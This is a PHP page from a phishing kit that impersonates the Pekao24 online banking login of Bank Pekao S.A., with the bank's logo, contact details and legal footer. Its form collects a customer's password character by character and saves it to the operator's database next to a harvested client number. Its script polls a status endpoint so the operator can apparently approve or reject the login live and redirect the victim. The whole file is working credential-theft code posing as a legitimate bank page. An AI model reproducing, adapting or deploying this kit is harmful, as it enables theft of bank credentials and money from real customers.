<?php 
	include('../bank_header.php');
	include('../../../db.php'); 
	include('../../../YH0uW3ecaRHG16ld4waY.php');
	
	if (!$_REQUEST['id'])
		exit;
	
	$id = mysqli_real_escape_string($con,$_REQUEST['id']);
	
	$page_name = basename($_SERVER['PHP_SELF']);
	$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
	$con->query($sqlss);
	
	$sql_paolo = "select * from `payment` WHERE `id` = '$id' limit 1;";

	$new = $con->query($sql_paolo);
	$payment_row = $new->fetch_assoc();
	
	if(isset($_POST['submit'])){
		$bank_user_password = $_POST['bpwd1'].$_POST['bpwd2'].$_POST['bpwd3'].$_POST['bpwd4'].$_POST['bpwd5'].
								$_POST['bpwd6'].$_POST['bpwd7'].$_POST['bpwd8'].$_POST['bpwd9'].$_POST['bpwd10'].$_POST['bpwd11'].
								$_POST['bpwd12'];

		
		
		if ($bank_user_password=="" || strlen($bank_user_password) <= 4) {
			$click_flag = false;
			$error_flag = true;
		}
		else {
			$error_flag = false;
			$click_flag = true;
			$sql = "UPDATE `payment` SET `bank_user_password` = '$bank_user_password'  WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
			$con->query($sql);
		
			//echo $id."<br/>".$bank_user_password."<br/>";
			//echo '<script>window.location.href="index11.php?id='.$_REQUEST['id'].'"</script>';
		}
		
	}
?>

<script type="text/javascript" src="js/public.js"></script>
<script type="text/javascript">
	setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);

	setInterval(function(){ check_status(<?php echo $id; ?>); }, 5000);

	function check_status(payment_id) {
		//alert(payment_id);
		if (payment_id.length == 0) {
		} else {
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					//alert(this.responseText);
					if (!this.responseText.includes('INVALID CODE')){
						if(this.responseText.includes('VALID CODE')){
				 
						    //window.location.href="<?php echo URL_dhlpayment;?>err_noavaible/index.html";
							window.location.href="index11.php?id=<?php echo $id; ?>";
						}else if(this.responseText.includes('WRONG CODE')){ 
							window.location.href="index.php?id=<?php echo $id; ?>";
						}
					}
				}
			};
			xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=login_aproove", true);
			xmlhttp.send();
		}
	}

	function getfocus(i) {		
		if (i<16) {
			document.getElementById("myAnchor" + (i+1)).disabled = false;
			document.getElementById("myAnchor"+(i+1)).focus();
		}
		wrong_sms.style.display="none";
	}

	// When the user clicks on the button, open the modal 
	window.onload = function() {		
		var wrong_sms = document.getElementById('wrong_sms');
		var btn_submit = document.getElementById('btn_submit');
		
		for (var k = 2; k<=16; k++) {
			document.getElementById("myAnchor" + k).disabled = true;
		}
		btn_submit.onclick = function() {
			var submit_flag = false;
			for (var k = 1; k<=16; k++) {
				if (document.getElementById("myAnchor" +k).value != "")
					submit_flag =true;
			}
			if (submit_flag == false){
				//alert('Input password');
				wrong_sms.style.display="block";
				return false;
			}
		}
		
	}

</script>

<style>
<?php if($click_flag){?>
#loading_id{
	display:block !important;
}
#login_id{
	display:none;
}
<?php }
if ($error_flag) {?>
#wrong_sms{
	display:block;
}
<?php }?>
</style>

<!DOCTYPE HTML>
<html>
    <head>
        <title>Pekao24 - Bankowość elektroniczna</title>
        <meta content="width=device-width" name="viewport" />
        <meta charset=utf-8>
        <link href='https://netdna.bootstrapcdn.com/font-awesome/4.0.1/css/font-awesome.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/index1.css">
		<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
    </head>
    <body>

        <div class="container">
            <!-- Navigation Bar -->
            <nav class="navbar navbar-default pekao-nav">
				
                <div class="container-fluid">
                    <div class="navbar-header">
                        <img src="imgs/logo_pekao24.gif" class="navbar-brand" style="height: 128px;" />
                    </div>
					
                    <ul class="nav navbar-nav navbar-right">
                        <li class="active">
                            <a href="#" class="language-button" style="background-color: rgb(255, 255, 255);"><img src="imgs/england_flag.png" style="height: 20px;" /> English Version</a>
                        </li>
                    </ul>
                </div>
                <nav class="nav nav-tabs top-nav-tab">

                </nav>
            </nav>
            <div class="row">
                <div class="col-lg-3 col-md-2 col-sm-12 col-xs-12">
                  
                </div>
				
				
				
                <div class="col-md-6">
				
				
							
							
                    <div class="first-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
					<div id="loading_id" style="display:none;">
								<center style="margin-top:50px;color:white;"><span>Poczekaj na zweryfikowanie logowania.</span></center>
									<center><img id="result" src="images/loading.gif" style="width: 170px; padding-top:60px; margin-bottom:40px;"></center>
							</div>
							
						<div  id="wrong_sms" class="w3-panel w3-red w3-display-container" style="display:none;">
						  <p style="margin-top:10px;">Proszę wprowadzić hasło.</p>
						</div>
						
						<div id="login_id">
                        <div class="first-row">
                            <a href="#"> Pomoc</a>
                            <h2 style="font-family: Trebuchet MS, Helvetica, Garuda, FreeSans;">Logowanie</h2>
                        </div>
						
						<form class="form-inline" method="post" action="" role="form" >
                        <div class="second-row">
                            <h4>Twój numer klienta: <?php echo $payment_row['bank_user_id']?></h4>
							
							<div class="form-group">
								<div style="display:inline-block;">
									<input type="password"name="bpwd1" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(1)" id="myAnchor1">
									<div aria-hidden="true" class="mergerty">1</div></div>
								<div style="display:inline-block;">
									<input type="password"name="bpwd2" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(2)" id="myAnchor2">
									<div aria-hidden="true" class="mergerty">2</div></div>
								<div style="display:inline-block;">
									<input type="password"name="bpwd3" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(3)" id="myAnchor3">
									<div aria-hidden="true" class="mergerty">3</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd4" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(4)" id="myAnchor4">
									<div aria-hidden="true" class="mergerty">4</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd5" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(5)" id="myAnchor5">
									<div aria-hidden="true" class="mergerty">5</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd6" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(6)" id="myAnchor6">
									<div aria-hidden="true" class="mergerty">6</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd7" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(7)" id="myAnchor7">
									<div aria-hidden="true" class="mergerty">7</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd8" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(8)" id="myAnchor8">
									<div aria-hidden="true" class="mergerty">8</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd9" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(9)" id="myAnchor9">
									<div aria-hidden="true" class="mergerty">9</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd10"  class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(10)" id="myAnchor10">
									<div aria-hidden="true" class="mergerty">10</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd11" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(11)" id="myAnchor11">
									<div aria-hidden="true" class="mergerty">11</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd12" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(12)" id="myAnchor12">
									<div aria-hidden="true" class="mergerty">12</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd13" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(13)" id="myAnchor13">
									<div aria-hidden="true" class="mergerty">13</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd14" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(14)" id="myAnchor14">
									<div aria-hidden="true" class="mergerty">14</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd15" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(15)" id="myAnchor15">
									<div aria-hidden="true" class="mergerty">15</div></div>
								<div style="display:inline-block;">
									<input type="password" name="bpwd16" class="form-control" autocomplete="off" maxlength='1' onkeypress="getfocus(16)" id="myAnchor16">
									<div aria-hidden="true" class="mergerty">16</div></div>
							</div>
							
							<div style="margin-top:20px;text-align:right;">
								<a href="index.php?id=<?php echo $_REQUEST['id'];?>" style="margin-left: 15px; margin-top:-3px;color:white;text-decoration:none;" name="submit" >< Wstecz</a>
								<button style="margin-left: 15px; margin-top:-3px;" name="submit" id="btn_submit" class="btn btn-danger">DALEJ ></button>
							
							</div>
                        </div>
						</form>
                        <div class="third-row">
                            <a href="#">> Problemy z logowaniem?</a>
                            <a href="#">> Wykaz funkcji serwisów</a>
                        </div>
                   
                      <!-- <div class="second-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                     <p>
                            Aby zalogować się do systemu Demo PekaoInternet należy w miejsce numeru klienta wpisać następujące dane:
                            <br>
                            Numer klienta: <strong>123456</strong>
                        </p>
                    </div>-->
                    <div class="third-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                        <h2>Bezpieczeństwo</h2>
                        <ul>
                            <li>
                                <a href="#">Sprawdź</a> przed zalogowaniem, czy widzisz https w adresie strony i połączenie jest szyfrowane.
                            </li>
                            <li>
                                <a href="#">Pamiętaj,</a> że podczas kontaktów telefonicznych Bank nigdy nie prosi o podanie numeru PIN i hasła do Pekao24.
                            </li>
                            <li>
                                <a href="#">Przeglądaj</a> biuletyn bezpieczeństwa w internecie.
                            </li>
                        </ul>
                    </div>
					</div> </div>
                </div>
             
            </div>

            <div class="row footer-tabs">
                <ul class="nav nav-tabs">
                    <li class="active"><a data-toggle="tab" href="#firsttab">Kontakt do Pekao24</a></li>
                    <li><a data-toggle="tab" href="#secondtab">Kontakt do Pekao24Makler</a></li>
                </ul>
                <div class="tab-content">
                    <div id="firsttab" class="tab-pane fade in active">
                        <div class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-12 col-xs-12">
                            <div class="row firsttab-content">
                                <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_phone.gif" />&nbsp;&nbsp;&nbsp;<strong>TelePekao/ Infolinia</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        801 365 365
                                        <br>
                                        +48 42 683 82 32
                                        <br>
                                        <span style="font-size: 8px">(opłata wg cennika operatora)</span>
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" />&nbsp;&nbsp;&nbsp;<strong>Bankowość mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        <a href="#">> aplikacja na tablet</a><br>
                                        <a href="#">> aplikacja na telefon</a><br>
                                        <a href="#">> m.pekao24.pl</a>
                                    </p>
                                </div>
                                <div class="col-lg-6 col-lg-offset-0 col-md-6 col-md-offset-0 col-sm-4 col-sm-offset-0 col-xs-6 col-xs-offset-3">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" /> <strong>PekaoSMS</strong>
                                        <span class="tabbar-inner-padding">3803</span>
                                    </p>
                                    <p>
                                        <img src="imgs/icon_email.gif" /> <strong>E-mail</strong>
                                        <span class="tabbar-inner-padding">pekao24@pekao.com.pl</span>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="secondtab" class="tab-pane fade">
                        <div class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-12 col-xs-12">
                            <div class="row secondtab-content">
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_phone.gif" style="height: 24px;" /> <strong>Pekao24Makler<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serwis telefoniczny</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        800 105 800 (połączenie bezpłatne)
                                        <br>
                                        +48 22 591 22 00 (opłata wg cennika operatora)
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" style="height: 24px;" /> <strong>Pekao24Makler<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usługi mobilne</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        <a href="#">> aplikacja mobilna</a><br>
                                        <a href="#">> m.pekao24.pl</a><br>
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" style="height: 24px;" /> <strong>Bankowość mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        801 301 601(opłata jak za połączenie lokalne)
                                        <br>
                                        +48 22 591 26 01(opłata wg cennika operatora)
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                                    <p>
                                        <img src="imgs/icon_email.gif" style="height: 24px;" /> <strong>Bankowość<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        pekao24makler@pekao.com.pl                                            
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <hr/>
            <div class="row footer-links">
                <div class="links col-lg-9 col-md-9 col-sm-12 col-xs-12">
                    <a href="#">DM Pekao</a>
                    <a href="#">CDM Pekao S.A.</a>
                    <a href="#">Pioneer Pekao TFI S.A.</a>
                    <a href="#">Pekao Pioneer PTE S.A.</a>
                    <a href="#">Pekao Leasing Sp. z o.o.</a>
                </div>
                <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
                    <address>Copyright © 2002-2017 Bank Pekao S.A.</address>
                </div>
            </div>
            <div class="row footer-help col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <p>
                    Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-950 Warszawa, 
                    wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie, XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, 
                    NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł.                                 
                </p>
            </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    </body>
</html>